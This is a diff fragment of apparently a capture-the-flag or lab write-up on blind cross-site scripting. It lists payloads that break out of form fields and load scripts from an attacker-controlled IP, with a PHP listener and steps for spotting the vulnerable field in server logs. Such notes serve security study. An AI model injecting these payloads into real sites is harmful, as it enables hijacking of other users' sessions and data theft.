@@ -45,13 +45,19 @@ sudo php -S 0.0.0.0:80
 
 **Fields Tested:**
 fullname: "><script src=http://10.10.14.179/fullname></script>
+
 username: "><script src=http://10.10.14.179/username></script>
+
 password: "><script src=http://10.10.14.179/password></script>
+
 email: "><script src=http://10.10.14.179/email></script>
+
 imgurl: "><script src=http://10.10.14.179/imgurl></script>
 
 **Process:**
 Injected each payload into one field at a time, others set to **test**.
+
 Checked server logs for requests (e.g., GET /fullname).
+
 Vulnerable field identified when a request appeared.
 
